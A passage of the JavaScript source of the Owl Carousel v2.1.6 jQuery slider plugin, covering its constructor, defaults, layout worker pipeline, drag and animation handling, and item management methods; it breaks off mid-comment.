/**
 * Owl Carousel v2.1.6
 * Copyright 2013-2016 David Deutsch
 * Licensed under MIT (https://github.com/OwlCarousel2/OwlCarousel2/blob/master/LICENSE)
 */
/**
 * Owl carousel
 * @version 2.1.6
 * @author Bartosz Wojciechowski
 * @author David Deutsch
 * @license The MIT License (MIT)
 * @todo Lazy Load Icon
 * @todo prevent animationend bubling
 * @todo itemsScaleUp
 * @todo Test Zepto
 * @todo stagePadding calculate wrong active classes
 */

;(function($, window, document, undefined) {

	/**
	 * Creates a carousel.
	 * @class The Owl Carousel.
	 * @public
	 * @param {HTMLElement|jQuery} element - The element to create the carousel for.
	 * @param {Object} [options] - The options
	 */
	function Owl(element, options) {

		/**
		 * Current settings for the carousel.
		 * @public
		 */
		this.settings = null;

		/**
		 * Current options set by the caller including defaults.
		 * @public
		 */
		this.options = $.extend({}, Owl.Defaults, options);

		/**
		 * Plugin element.
		 * @public
		 */
		this.$element = $(element);

		/**
		 * Proxied event handlers.
		 * @protected
		 */
		this._handlers = {};

		/**
		 * References to the running plugins of this carousel.
		 * @protected
		 */
		this._plugins = {};

		/**
		 * Currently suppressed events to prevent them from beeing retriggered.
		 * @protected
		 */
		this._supress = {};

		/**
		 * Absolute current position.
		 * @protected
		 */
		this._current = null;

		/**
		 * Animation speed in milliseconds.
		 * @protected
		 */
		this._speed = null;

		/**
		 * Coordinates of all items in pixel.
		 * @todo The name of this member is missleading.
		 * @protected
		 */
		this._coordinates = [];

		/**
		 * Current breakpoint.
		 * @todo Real media queries would be nice.
		 * @protected
		 */
		this._breakpoint = null;

		/**
		 * Current width of the plugin element.
		 */
		this._width = null;

		/**
		 * All real items.
		 * @protected
		 */
		this._items = [];

		/**
		 * All cloned items.
		 * @protected
		 */
		this._clones = [];

		/**
		 * Merge values of all items.
		 * @todo Maybe this could be part of a plugin.
		 * @protected
		 */
		this._mergers = [];

		/**
		 * Widths of all items.
		 */
		this._widths = [];

		/**
		 * Invalidated parts within the update process.
		 * @protected
		 */
		this._invalidated = {};

		/**
		 * Ordered list of workers for the update process.
		 * @protected
		 */
		this._pipe = [];

		/**
		 * Current state information for the drag operation.
		 * @todo #261
		 * @protected
		 */
		this._drag = {
			time: null,
			target: null,
			pointer: null,
			stage: {
				start: null,
				current: null
			},
			direction: null
		};

		/**
		 * Current state information and their tags.
		 * @type {Object}
		 * @protected
		 */
		this._states = {
			current: {},
			tags: {
				'initializing': [ 'busy' ],
				'animating': [ 'busy' ],
				'dragging': [ 'interacting' ]
			}
		};

		$.each([ 'onResize', 'onThrottledResize' ], $.proxy(function(i, handler) {
			this._handlers[handler] = $.proxy(this[handler], this);
		}, this));

		$.each(Owl.Plugins, $.proxy(function(key, plugin) {
			this._plugins[key.charAt(0).toLowerCase() + key.slice(1)]
				= new plugin(this);
		}, this));

		$.each(Owl.Workers, $.proxy(function(priority, worker) {
			this._pipe.push({
				'filter': worker.filter,
				'run': $.proxy(worker.run, this)
			});
		}, this));

		this.setup();
		this.initialize();
	}

	/**
	 * Default options for the carousel.
	 * @public
	 */
	Owl.Defaults = {
		items: 3,
		loop: false,
		center: false,
		rewind: false,

		mouseDrag: true,
		touchDrag: true,
		pullDrag: true,
		freeDrag: false,

		margin: 0,
		stagePadding: 0,

		merge: false,
		mergeFit: true,
		autoWidth: false,

		startPosition: 0,
		rtl: false,

		smartSpeed: 250,
		fluidSpeed: false,
		dragEndSpeed: false,

		responsive: {},
		responsiveRefreshRate: 200,
		responsiveBaseElement: window,

		fallbackEasing: 'swing',

		info: false,

		nestedItemSelector: false,
		itemElement: 'div',
		stageElement: 'div',

		refreshClass: 'owl-refresh',
		loadedClass: 'owl-loaded',
		loadingClass: 'owl-loading',
		rtlClass: 'owl-rtl',
		responsiveClass: 'owl-responsive',
		dragClass: 'owl-drag',
		itemClass: 'owl-item',
		stageClass: 'owl-stage',
		stageOuterClass: 'owl-stage-outer',
		grabClass: 'owl-grab'
	};

	/**
	 * Enumeration for width.
	 * @public
	 * @readonly
	 * @enum {String}
	 */
	Owl.Width = {
		Default: 'default',
		Inner: 'inner',
		Outer: 'outer'
	};

	/**
	 * Enumeration for types.
	 * @public
	 * @readonly
	 * @enum {String}
	 */
	Owl.Type = {
		Event: 'event',
		State: 'state'
	};

	/**
	 * Contains all registered plugins.
	 * @public
	 */
	Owl.Plugins = {};

	/**
	 * List of workers involved in the update process.
	 */
	Owl.Workers = [ {
		filter: [ 'width', 'settings' ],
		run: function() {
			this._width = this.$element.width();
		}
	}, {
		filter: [ 'width', 'items', 'settings' ],
		run: function(cache) {
			cache.current = this._items && this._items[this.relative(this._current)];
		}
	}, {
		filter: [ 'items', 'settings' ],
		run: function() {
			this.$stage.children('.cloned').remove();
		}
	}, {
		filter: [ 'width', 'items', 'settings' ],
		run: function(cache) {
			var margin = this.settings.margin || '',
				grid = !this.settings.autoWidth,
				rtl = this.settings.rtl,
				css = {
					'width': 'auto',
					'margin-left': rtl ? margin : '',
					'margin-right': rtl ? '' : margin
				};

			!grid && this.$stage.children().css(css);

			cache.css = css;
		}
	}, {
		filter: [ 'width', 'items', 'settings' ],
		run: function(cache) {
			var width = (this.width() / this.settings.items).toFixed(3) - this.settings.margin,
				merge = null,
				iterator = this._items.length,
				grid = !this.settings.autoWidth,
				widths = [];

			cache.items = {
				merge: false,
				width: width
			};

			while (iterator--) {
				merge = this._mergers[iterator];
				merge = this.settings.mergeFit && Math.min(merge, this.settings.items) || merge;

				cache.items.merge = merge > 1 || cache.items.merge;

				widths[iterator] = !grid ? this._items[iterator].width() : width * merge;
			}

			this._widths = widths;
		}
	}, {
		filter: [ 'items', 'settings' ],
		run: function() {
			var clones = [],
				items = this._items,
				settings = this.settings,
				view = Math.max(settings.items * 2, 4),
				size = Math.ceil(items.length / 2) * 2,
				repeat = settings.loop && items.length ? settings.rewind ? view : Math.max(view, size) : 0,
				append = '',
				prepend = '';

			repeat /= 2;

			while (repeat--) {
				clones.push(this.normalize(clones.length / 2, true));
				append = append + items[clones[clones.length - 1]][0].outerHTML;
				clones.push(this.normalize(items.length - 1 - (clones.length - 1) / 2, true));
				prepend = items[clones[clones.length - 1]][0].outerHTML + prepend;
			}

			this._clones = clones;

			$(append).addClass('cloned').appendTo(this.$stage);
			$(prepend).addClass('cloned').prependTo(this.$stage);
		}
	}, {
		filter: [ 'width', 'items', 'settings' ],
		run: function() {
			var rtl = this.settings.rtl ? 1 : -1,
				size = this._clones.length + this._items.length,
				iterator = -1,
				previous = 0,
				current = 0,
				coordinates = [];

			while (++iterator < size) {
				previous = coordinates[iterator - 1] || 0;
				current = this._widths[this.relative(iterator)] + this.settings.margin;
				coordinates.push(previous + current * rtl);
			}

			this._coordinates = coordinates;
		}
	}, {
		filter: [ 'width', 'items', 'settings' ],
		run: function() {
			var padding = this.settings.stagePadding,
				coordinates = this._coordinates,
				css = {
					'width': Math.ceil(Math.abs(coordinates[coordinates.length - 1])) + padding * 2,
					'padding-left': padding || '',
					'padding-right': padding || ''
				};

			this.$stage.css(css);
		}
	}, {
		filter: [ 'width', 'items', 'settings' ],
		run: function(cache) {
			var iterator = this._coordinates.length,
				grid = !this.settings.autoWidth,
				items = this.$stage.children();

			if (grid && cache.items.merge) {
				while (iterator--) {
					cache.css.width = this._widths[this.relative(iterator)];
					items.eq(iterator).css(cache.css);
				}
			} else if (grid) {
				cache.css.width = cache.items.width;
				items.css(cache.css);
			}
		}
	}, {
		filter: [ 'items' ],
		run: function() {
			this._coordinates.length < 1 && this.$stage.removeAttr('style');
		}
	}, {
		filter: [ 'width', 'items', 'settings' ],
		run: function(cache) {
			cache.current = cache.current ? this.$stage.children().index(cache.current) : 0;
			cache.current = Math.max(this.minimum(), Math.min(this.maximum(), cache.current));
			this.reset(cache.current);
		}
	}, {
		filter: [ 'position' ],
		run: function() {
			this.animate(this.coordinates(this._current));
		}
	}, {
		filter: [ 'width', 'position', 'items', 'settings' ],
		run: function() {
			var rtl = this.settings.rtl ? 1 : -1,
				padding = this.settings.stagePadding * 2,
				begin = this.coordinates(this.current()) + padding,
				end = begin + this.width() * rtl,
				inner, outer, matches = [], i, n;

			for (i = 0, n = this._coordinates.length; i < n; i++) {
				inner = this._coordinates[i - 1] || 0;
				outer = Math.abs(this._coordinates[i]) + padding * rtl;

				if ((this.op(inner, '<=', begin) && (this.op(inner, '>', end)))
					|| (this.op(outer, '<', begin) && this.op(outer, '>', end))) {
					matches.push(i);
				}
			}

			this.$stage.children('.active').removeClass('active');
			this.$stage.children(':eq(' + matches.join('), :eq(') + ')').addClass('active');

			if (this.settings.center) {
				this.$stage.children('.center').removeClass('center');
				this.$stage.children().eq(this.current()).addClass('center');
			}
		}
	} ];

	/**
	 * Initializes the carousel.
	 * @protected
	 */
	Owl.prototype.initialize = function() {
		this.enter('initializing');
		this.trigger('initialize');

		this.$element.toggleClass(this.settings.rtlClass, this.settings.rtl);

		if (this.settings.autoWidth && !this.is('pre-loading')) {
			var imgs, nestedSelector, width;
			imgs = this.$element.find('img');
			nestedSelector = this.settings.nestedItemSelector ? '.' + this.settings.nestedItemSelector : undefined;
			width = this.$element.children(nestedSelector).width();

			if (imgs.length && width <= 0) {
				this.preloadAutoWidthImages(imgs);
			}
		}

		this.$element.addClass(this.options.loadingClass);

		// create stage
		this.$stage = $('<' + this.settings.stageElement + ' class="' + this.settings.stageClass + '"/>')
			.wrap('<div class="' + this.settings.stageOuterClass + '"/>');

		// append stage
		this.$element.append(this.$stage.parent());

		// append content
		this.replace(this.$element.children().not(this.$stage.parent()));

		// check visibility
		if (this.$element.is(':visible')) {
			// update view
			this.refresh();
		} else {
			// invalidate width
			this.invalidate('width');
		}

		this.$element
			.removeClass(this.options.loadingClass)
			.addClass(this.options.loadedClass);

		// register event handlers
		this.registerEventHandlers();

		this.leave('initializing');
		this.trigger('initialized');
	};

	/**
	 * Setups the current settings.
	 * @todo Remove responsive classes. Why should adaptive designs be brought into IE8?
	 * @todo Support for media queries by using `matchMedia` would be nice.
	 * @public
	 */
	Owl.prototype.setup = function() {
		var viewport = this.viewport(),
			overwrites = this.options.responsive,
			match = -1,
			settings = null;

		if (!overwrites) {
			settings = $.extend({}, this.options);
		} else {
			$.each(overwrites, function(breakpoint) {
				if (breakpoint <= viewport && breakpoint > match) {
					match = Number(breakpoint);
				}
			});

			settings = $.extend({}, this.options, overwrites[match]);
			if (typeof settings.stagePadding === 'function') {
				settings.stagePadding = settings.stagePadding();
			}
			delete settings.responsive;

			// responsive class
			if (settings.responsiveClass) {
				this.$element.attr('class',
					this.$element.attr('class').replace(new RegExp('(' + this.options.responsiveClass + '-)\\S+\\s', 'g'), '$1' + match)
				);
			}
		}

		this.trigger('change', { property: { name: 'settings', value: settings } });
		this._breakpoint = match;
		this.settings = settings;
		this.invalidate('settings');
		this.trigger('changed', { property: { name: 'settings', value: this.settings } });
	};

	/**
	 * Updates option logic if necessery.
	 * @protected
	 */
	Owl.prototype.optionsLogic = function() {
		if (this.settings.autoWidth) {
			this.settings.stagePadding = false;
			this.settings.merge = false;
		}
	};

	/**
	 * Prepares an item before add.
	 * @todo Rename event parameter `content` to `item`.
	 * @protected
	 * @returns {jQuery|HTMLElement} - The item container.
	 */
	Owl.prototype.prepare = function(item) {
		var event = this.trigger('prepare', { content: item });

		if (!event.data) {
			event.data = $('<' + this.settings.itemElement + '/>')
				.addClass(this.options.itemClass).append(item)
		}

		this.trigger('prepared', { content: event.data });

		return event.data;
	};

	/**
	 * Updates the view.
	 * @public
	 */
	Owl.prototype.update = function() {
		var i = 0,
			n = this._pipe.length,
			filter = $.proxy(function(p) { return this[p] }, this._invalidated),
			cache = {};

		while (i < n) {
			if (this._invalidated.all || $.grep(this._pipe[i].filter, filter).length > 0) {
				this._pipe[i].run(cache);
			}
			i++;
		}

		this._invalidated = {};

		!this.is('valid') && this.enter('valid');
	};

	/**
	 * Gets the width of the view.
	 * @public
	 * @param {Owl.Width} [dimension=Owl.Width.Default] - The dimension to return.
	 * @returns {Number} - The width of the view in pixel.
	 */
	Owl.prototype.width = function(dimension) {
		dimension = dimension || Owl.Width.Default;
		switch (dimension) {
			case Owl.Width.Inner:
			case Owl.Width.Outer:
				return this._width;
			default:
				return this._width - this.settings.stagePadding * 2 + this.settings.margin;
		}
	};

	/**
	 * Refreshes the carousel primarily for adaptive purposes.
	 * @public
	 */
	Owl.prototype.refresh = function() {
		this.enter('refreshing');
		this.trigger('refresh');

		this.setup();

		this.optionsLogic();

		this.$element.addClass(this.options.refreshClass);

		this.update();

		this.$element.removeClass(this.options.refreshClass);

		this.leave('refreshing');
		this.trigger('refreshed');
	};

	/**
	 * Checks window `resize` event.
	 * @protected
	 */
	Owl.prototype.onThrottledResize = function() {
		window.clearTimeout(this.resizeTimer);
		this.resizeTimer = window.setTimeout(this._handlers.onResize, this.settings.responsiveRefreshRate);
	};

	/**
	 * Checks window `resize` event.
	 * @protected
	 */
	Owl.prototype.onResize = function() {
		if (!this._items.length) {
			return false;
		}

		if (this._width === this.$element.width()) {
			return false;
		}

		if (!this.$element.is(':visible')) {
			return false;
		}

		this.enter('resizing');

		if (this.trigger('resize').isDefaultPrevented()) {
			this.leave('resizing');
			return false;
		}

		this.invalidate('width');

		this.refresh();

		this.leave('resizing');
		this.trigger('resized');
	};

	/**
	 * Registers event handlers.
	 * @todo Check `msPointerEnabled`
	 * @todo #261
	 * @protected
	 */
	Owl.prototype.registerEventHandlers = function() {
		if ($.support.transition) {
			this.$stage.on($.support.transition.end + '.owl.core', $.proxy(this.onTransitionEnd, this));
		}

		if (this.settings.responsive !== false) {
			this.on(window, 'resize', this._handlers.onThrottledResize);
		}

		if (this.settings.mouseDrag) {
			this.$element.addClass(this.options.dragClass);
			this.$stage.on('mousedown.owl.core', $.proxy(this.onDragStart, this));
			this.$stage.on('dragstart.owl.core selectstart.owl.core', function() { return false });
		}

		if (this.settings.touchDrag){
			this.$stage.on('touchstart.owl.core', $.proxy(this.onDragStart, this));
			this.$stage.on('touchcancel.owl.core', $.proxy(this.onDragEnd, this));
		}
	};

	/**
	 * Handles `touchstart` and `mousedown` events.
	 * @todo Horizontal swipe threshold as option
	 * @todo #261
	 * @protected
	 * @param {Event} event - The event arguments.
	 */
	Owl.prototype.onDragStart = function(event) {
		var stage = null;

		if (event.which === 3) {
			return;
		}

		if ($.support.transform) {
			stage = this.$stage.css('transform').replace(/.*\(|\)| /g, '').split(',');
			stage = {
				x: stage[stage.length === 16 ? 12 : 4],
				y: stage[stage.length === 16 ? 13 : 5]
			};
		} else {
			stage = this.$stage.position();
			stage = {
				x: this.settings.rtl ?
					stage.left + this.$stage.width() - this.width() + this.settings.margin :
					stage.left,
				y: stage.top
			};
		}

		if (this.is('animating')) {
			$.support.transform ? this.animate(stage.x) : this.$stage.stop()
			this.invalidate('position');
		}

		this.$element.toggleClass(this.options.grabClass, event.type === 'mousedown');

		this.speed(0);

		this._drag.time = new Date().getTime();
		this._drag.target = $(event.target);
		this._drag.stage.start = stage;
		this._drag.stage.current = stage;
		this._drag.pointer = this.pointer(event);

		$(document).on('mouseup.owl.core touchend.owl.core', $.proxy(this.onDragEnd, this));

		$(document).one('mousemove.owl.core touchmove.owl.core', $.proxy(function(event) {
			var delta = this.difference(this._drag.pointer, this.pointer(event));

			$(document).on('mousemove.owl.core touchmove.owl.core', $.proxy(this.onDragMove, this));

			if (Math.abs(delta.x) < Math.abs(delta.y) && this.is('valid')) {
				return;
			}

			event.preventDefault();

			this.enter('dragging');
			this.trigger('drag');
		}, this));
	};

	/**
	 * Handles the `touchmove` and `mousemove` events.
	 * @todo #261
	 * @protected
	 * @param {Event} event - The event arguments.
	 */
	Owl.prototype.onDragMove = function(event) {
		var minimum = null,
			maximum = null,
			pull = null,
			delta = this.difference(this._drag.pointer, this.pointer(event)),
			stage = this.difference(this._drag.stage.start, delta);

		if (!this.is('dragging')) {
			return;
		}

		event.preventDefault();

		if (this.settings.loop) {
			minimum = this.coordinates(this.minimum());
			maximum = this.coordinates(this.maximum() + 1) - minimum;
			stage.x = (((stage.x - minimum) % maximum + maximum) % maximum) + minimum;
		} else {
			minimum = this.settings.rtl ? this.coordinates(this.maximum()) : this.coordinates(this.minimum());
			maximum = this.settings.rtl ? this.coordinates(this.minimum()) : this.coordinates(this.maximum());
			pull = this.settings.pullDrag ? -1 * delta.x / 5 : 0;
			stage.x = Math.max(Math.min(stage.x, minimum + pull), maximum + pull);
		}

		this._drag.stage.current = stage;

		this.animate(stage.x);
	};

	/**
	 * Handles the `touchend` and `mouseup` events.
	 * @todo #261
	 * @todo Threshold for click event
	 * @protected
	 * @param {Event} event - The event arguments.
	 */
	Owl.prototype.onDragEnd = function(event) {
		var delta = this.difference(this._drag.pointer, this.pointer(event)),
			stage = this._drag.stage.current,
			direction = delta.x > 0 ^ this.settings.rtl ? 'left' : 'right';

		$(document).off('.owl.core');

		this.$element.removeClass(this.options.grabClass);

		if (delta.x !== 0 && this.is('dragging') || !this.is('valid')) {
			this.speed(this.settings.dragEndSpeed || this.settings.smartSpeed);
			this.current(this.closest(stage.x, delta.x !== 0 ? direction : this._drag.direction));
			this.invalidate('position');
			this.update();

			this._drag.direction = direction;

			if (Math.abs(delta.x) > 3 || new Date().getTime() - this._drag.time > 300) {
				this._drag.target.one('click.owl.core', function() { return false; });
			}
		}

		if (!this.is('dragging')) {
			return;
		}

		this.leave('dragging');
		this.trigger('dragged');
	};

	/**
	 * Gets absolute position of the closest item for a coordinate.
	 * @todo Setting `freeDrag` makes `closest` not reusable. See #165.
	 * @protected
	 * @param {Number} coordinate - The coordinate in pixel.
	 * @param {String} direction - The direction to check for the closest item. Ether `left` or `right`.
	 * @return {Number} - The absolute position of the closest item.
	 */
	Owl.prototype.closest = function(coordinate, direction) {
		var position = -1,
			pull = 30,
			width = this.width(),
			coordinates = this.coordinates();

		if (!this.settings.freeDrag) {
			// check closest item
			$.each(coordinates, $.proxy(function(index, value) {
				// on a left pull, check on current index
				if (direction === 'left' && coordinate > value - pull && coordinate < value + pull) {
					position = index;
				// on a right pull, check on previous index
				// to do so, subtract width from value and set position = index + 1
				} else if (direction === 'right' && coordinate > value - width - pull && coordinate < value - width + pull) {
					position = index + 1;
				} else if (this.op(coordinate, '<', value)
					&& this.op(coordinate, '>', coordinates[index + 1] || value - width)) {
					position = direction === 'left' ? index + 1 : index;
				}
				return position === -1;
			}, this));
		}

		if (!this.settings.loop) {
			// non loop boundries
			if (this.op(coordinate, '>', coordinates[this.minimum()])) {
				position = coordinate = this.minimum();
			} else if (this.op(coordinate, '<', coordinates[this.maximum()])) {
				position = coordinate = this.maximum();
			}
		}

		return position;
	};

	/**
	 * Animates the stage.
	 * @todo #270
	 * @public
	 * @param {Number} coordinate - The coordinate in pixels.
	 */
	Owl.prototype.animate = function(coordinate) {
		var animate = this.speed() > 0;

		this.is('animating') && this.onTransitionEnd();

		if (animate) {
			this.enter('animating');
			this.trigger('translate');
		}

		if ($.support.transform3d && $.support.transition) {
			this.$stage.css({
				transform: 'translate3d(' + coordinate + 'px,0px,0px)',
				transition: (this.speed() / 1000) + 's'
			});
		} else if (animate) {
			this.$stage.animate({
				left: coordinate + 'px'
			}, this.speed(), this.settings.fallbackEasing, $.proxy(this.onTransitionEnd, this));
		} else {
			this.$stage.css({
				left: coordinate + 'px'
			});
		}
	};

	/**
	 * Checks whether the carousel is in a specific state or not.
	 * @param {String} state - The state to check.
	 * @returns {Boolean} - The flag which indicates if the carousel is busy.
	 */
	Owl.prototype.is = function(state) {
		return this._states.current[state] && this._states.current[state] > 0;
	};

	/**
	 * Sets the absolute position of the current item.
	 * @public
	 * @param {Number} [position] - The new absolute position or nothing to leave it unchanged.
	 * @returns {Number} - The absolute position of the current item.
	 */
	Owl.prototype.current = function(position) {
		if (position === undefined) {
			return this._current;
		}

		if (this._items.length === 0) {
			return undefined;
		}

		position = this.normalize(position);

		if (this._current !== position) {
			var event = this.trigger('change', { property: { name: 'position', value: position } });

			if (event.data !== undefined) {
				position = this.normalize(event.data);
			}

			this._current = position;

			this.invalidate('position');

			this.trigger('changed', { property: { name: 'position', value: this._current } });
		}

		return this._current;
	};

	/**
	 * Invalidates the given part of the update routine.
	 * @param {String} [part] - The part to invalidate.
	 * @returns {Array.<String>} - The invalidated parts.
	 */
	Owl.prototype.invalidate = function(part) {
		if ($.type(part) === 'string') {
			this._invalidated[part] = true;
			this.is('valid') && this.leave('valid');
		}
		return $.map(this._invalidated, function(v, i) { return i });
	};

	/**
	 * Resets the absolute position of the current item.
	 * @public
	 * @param {Number} position - The absolute position of the new item.
	 */
	Owl.prototype.reset = function(position) {
		position = this.normalize(position);

		if (position === undefined) {
			return;
		}

		this._speed = 0;
		this._current = position;

		this.suppress([ 'translate', 'translated' ]);

		this.animate(this.coordinates(position));

		this.release([ 'translate', 'translated' ]);
	};

	/**
	 * Normalizes an absolute or a relative position of an item.
	 * @public
	 * @param {Number} position - The absolute or relative position to normalize.
	 * @param {Boolean} [relative=false] - Whether the given position is relative or not.
	 * @returns {Number} - The normalized position.
	 */
	Owl.prototype.normalize = function(position, relative) {
		var n = this._items.length,
			m = relative ? 0 : this._clones.length;

		if (!this.isNumeric(position) || n < 1) {
			position = undefined;
		} else if (position < 0 || position >= n + m) {
			position = ((position - m / 2) % n + n) % n + m / 2;
		}

		return position;
	};

	/**
	 * Converts an absolute position of an item into a relative one.
	 * @public
	 * @param {Number} position - The absolute position to convert.
	 * @returns {Number} - The converted position.
	 */
	Owl.prototype.relative = function(position) {
		position -= this._clones.length / 2;
		return this.normalize(position, true);
	};

	/**
	 * Gets the maximum position for the current item.
	 * @public
	 * @param {Boolean} [relative=false] - Whether to return an absolute position or a relative position.
	 * @returns {Number}
	 */
	Owl.prototype.maximum = function(relative) {
		var settings = this.settings,
			maximum = this._coordinates.length,
			iterator,
			reciprocalItemsWidth,
			elementWidth;

		if (settings.loop) {
			maximum = this._clones.length / 2 + this._items.length - 1;
		} else if (settings.autoWidth || settings.merge) {
			iterator = this._items.length;
			reciprocalItemsWidth = this._items[--iterator].width();
			elementWidth = this.$element.width();
			while (iterator--) {
				reciprocalItemsWidth += this._items[iterator].width() + this.settings.margin;
				if (reciprocalItemsWidth > elementWidth) {
					break;
				}
			}
			maximum = iterator + 1;
		} else if (settings.center) {
			maximum = this._items.length - 1;
		} else {
			maximum = this._items.length - settings.items;
		}

		if (relative) {
			maximum -= this._clones.length / 2;
		}

		return Math.max(maximum, 0);
	};

	/**
	 * Gets the minimum position for the current item.
	 * @public
	 * @param {Boolean} [relative=false] - Whether to return an absolute position or a relative position.
	 * @returns {Number}
	 */
	Owl.prototype.minimum = function(relative) {
		return relative ? 0 : this._clones.length / 2;
	};

	/**
	 * Gets an item at the specified relative position.
	 * @public
	 * @param {Number} [position] - The relative position of the item.
	 * @return {jQuery|Array.<jQuery>} - The item at the given position or all items if no position was given.
	 */
	Owl.prototype.items = function(position) {
		if (position === undefined) {
			return this._items.slice();
		}

		position = this.normalize(position, true);
		return this._items[position];
	};

	/**
	 * Gets an item at the specified relative position.
	 * @public
	 * @param {Number} [position] - The relative position of the item.
	 * @return {jQuery|Array.<jQuery>} - The item at the given position or all items if no position was given.
	 */
	Owl.prototype.mergers = function(position) {
		if (position === undefined) {
			return this._mergers.slice();
		}

		position = this.normalize(position, true);
		return this._mergers[position];
	};

	/**
	 * Gets the absolute positions of clones for an item.
	 * @public
	 * @param {Number} [position] - The relative position of the item.
	 * @returns {Array.<Number>} - The absolute positions of clones for the item or all if no position was given.
	 */
	Owl.prototype.clones = function(position) {
		var odd = this._clones.length / 2,
			even = odd + this._items.length,
			map = function(index) { return index % 2 === 0 ? even + index / 2 : odd - (index + 1) / 2 };

		if (position === undefined) {
			return $.map(this._clones, function(v, i) { return map(i) });
		}

		return $.map(this._clones, function(v, i) { return v === position ? map(i) : null });
	};

	/**
	 * Sets the current animation speed.
	 * @public
	 * @param {Number} [speed] - The animation speed in milliseconds or nothing to leave it unchanged.
	 * @returns {Number} - The current animation speed in milliseconds.
	 */
	Owl.prototype.speed = function(speed) {
		if (speed !== undefined) {
			this._speed = speed;
		}

		return this._speed;
	};

	/**
	 * Gets the coordinate of an item.
	 * @todo The name of this method is missleanding.
	 * @public
	 * @param {Number} position - The absolute position of the item within `minimum()` and `maximum()`.
	 * @returns {Number|Array.<Number>} - The coordinate of the item in pixel or all coordinates.
	 */
	Owl.prototype.coordinates = function(position) {
		var multiplier = 1,
			newPosition = position - 1,
			coordinate;

		if (position === undefined) {
			return $.map(this._coordinates, $.proxy(function(coordinate, index) {
				return this.coordinates(index);
			}, this));
		}

		if (this.settings.center) {
			if (this.settings.rtl) {
				multiplier = -1;
				newPosition = position + 1;
			}

			coordinate = this._coordinates[position];
			coordinate += (this.width() - coordinate + (this._coordinates[newPosition] || 0)) / 2 * multiplier;
		} else {
			coordinate = this._coordinates[newPosition] || 0;
		}

		coordinate = Math.ceil(coordinate);

		return coordinate;
	};

	/**
	 * Calculates the speed for a translation.
	 * @protected
	 * @param {Number} from - The absolute position of the start item.
	 * @param {Number} to - The absolute position of the target item.
	 * @param {Number} [factor=undefined] - The time factor in milliseconds.
	 * @returns {Number} - The time in milliseconds for the translation.
	 */
	Owl.prototype.duration = function(from, to, factor) {
		if (factor === 0) {
			return 0;
		}

		return Math.min(Math.max(Math.abs(to - from), 1), 6) * Math.abs((factor || this.settings.smartSpeed));
	};

	/**
	 * Slides to the specified item.
	 * @public
	 * @param {Number} position - The position of the item.
	 * @param {Number} [speed] - The time in milliseconds for the transition.
	 */
	Owl.prototype.to = function(position, speed) {
		var current = this.current(),
			revert = null,
			distance = position - this.relative(current),
			direction = (distance > 0) - (distance < 0),
			items = this._items.length,
			minimum = this.minimum(),
			maximum = this.maximum();

		if (this.settings.loop) {
			if (!this.settings.rewind && Math.abs(distance) > items / 2) {
				distance += direction * -1 * items;
			}

			position = current + distance;
			revert = ((position - minimum) % items + items) % items + minimum;

			if (revert !== position && revert - distance <= maximum && revert - distance > 0) {
				current = revert - distance;
				position = revert;
				this.reset(current);
			}
		} else if (this.settings.rewind) {
			maximum += 1;
			position = (position % maximum + maximum) % maximum;
		} else {
			position = Math.max(minimum, Math.min(maximum, position));
		}

		this.speed(this.duration(current, position, speed));
		this.current(position);

		if (this.$element.is(':visible')) {
			this.update();
		}
	};

	/**
	 * Slides to the next item.
	 * @public
	 * @param {Number} [speed] - The time in milliseconds for the transition.
	 */
	Owl.prototype.next = function(speed) {
		speed = speed || false;
		this.to(this.relative(this.current()) + 1, speed);
	};

	/**
	 * Slides to the previous item.
	 * @public
	 * @param {Number} [speed] - The time in milliseconds for the transition.
	 */
	Owl.prototype.prev = function(speed) {
		speed = speed || false;
		this.to(this.relative(this.current()) - 1, speed);
	};

	/**
	 * Handles the end of an animation.
	 * @protected
	 * @param {Event} event - The event arguments.
	 */
	Owl.prototype.onTransitionEnd = function(event) {

		// if css2 animation then event object is undefined
		if (event !== undefined) {
			event.stopPropagation();

			// Catch only owl-stage transitionEnd event
			if ((event.target || event.srcElement || event.originalTarget) !== this.$stage.get(0)) {
				return false;
			}
		}

		this.leave('animating');
		this.trigger('translated');
	};

	/**
	 * Gets viewport width.
	 * @protected
	 * @return {Number} - The width in pixel.
	 */
	Owl.prototype.viewport = function() {
		var width;
		if (this.options.responsiveBaseElement !== window) {
			width = $(this.options.responsiveBaseElement).width();
		} else if (window.innerWidth) {
			width = window.innerWidth;
		} else if (document.documentElement && document.documentElement.clientWidth) {
			width = document.documentElement.clientWidth;
		} else {
			throw 'Can not detect viewport width.';
		}
		return width;
	};

	/**
	 * Replaces the current content.
	 * @public
	 * @param {HTMLElement|jQuery|String} content - The new content.
	 */
	Owl.prototype.replace = function(content) {
		this.$stage.empty();
		this._items = [];

		if (content) {
			content = (content instanceof jQuery) ? content : $(content);
		}

		if (this.settings.nestedItemSelector) {
			content = content.find('.' + this.settings.nestedItemSelector);
		}

		content.filter(function() {
			return this.nodeType === 1;
		}).each($.proxy(function(index, item) {
			item = this.prepare(item);
			this.$stage.append(item);
			this._items.push(item);
			this._mergers.push(item.find('[data-merge]').addBack('[data-merge]').attr('data-merge') * 1 || 1);
		}, this));

		this.reset(this.isNumeric(this.settings.startPosition) ? this.settings.startPosition : 0);

		this.invalidate('items');
	};

	/**
	 * Adds an item.
	 * @todo Use `item` instead of `content` for the event arguments.
	 * @public
	 * @param {HTMLElement|jQuery|String} content - The item content to add.
	 * @param {Number} [position] - The relative position at which to insert the item otherwise the item will be added to the end.
	 */
	Owl.prototype.add = function(content, position) {
		var current = this.relative(this._current);

		position = position === undefined ? this._items.length : this.normalize(position, true);
		content = content instanceof jQuery ? content : $(content);

		this.trigger('add', { content: content, position: position });

		content = this.prepare(content);

		if (this._items.length === 0 || position === this._items.length) {
			this._items.length === 0 && this.$stage.append(content);
			this._items.length !== 0 && this._items[position - 1].after(content);
			this._items.push(content);
			this._mergers.push(content.find('[data-merge]').addBack('[data-merge]').attr('data-merge') * 1 || 1);
		} else {
			this._items[position].before(content);
			this._items.splice(position, 0, content);
			this._mergers.splice(position, 0, content.find('[data-merge]').addBack('[data-merge]').attr('data-merge') * 1 || 1);
		}

		this._items[current] && this.reset(this._items[current].index());

		this.invalidate('items');

		this.trigger('added', { content: content, position: position });
	};

	/**
	 * Removes an item by its position.
	 * @todo Use `item` instead of `content` for the event arguments.
	 * @public
	 * @param {Number} position - The relative position of the item to remove.
	 */
	Owl.prototype.remove = function(position) {
		position = this.normalize(position, true);

		if (position === undefined) {
			return;
		}

		this.trigger('remove', { content: this._items[position], position: position });

		this._items[position].remove();
		this._items.splice(position, 1);
		this._mergers.splice(position, 1);

		this.invalidate('items');

		this.trigger('removed', { content: null, position: position });
	};

	/**
	 * Preloads images with auto width.
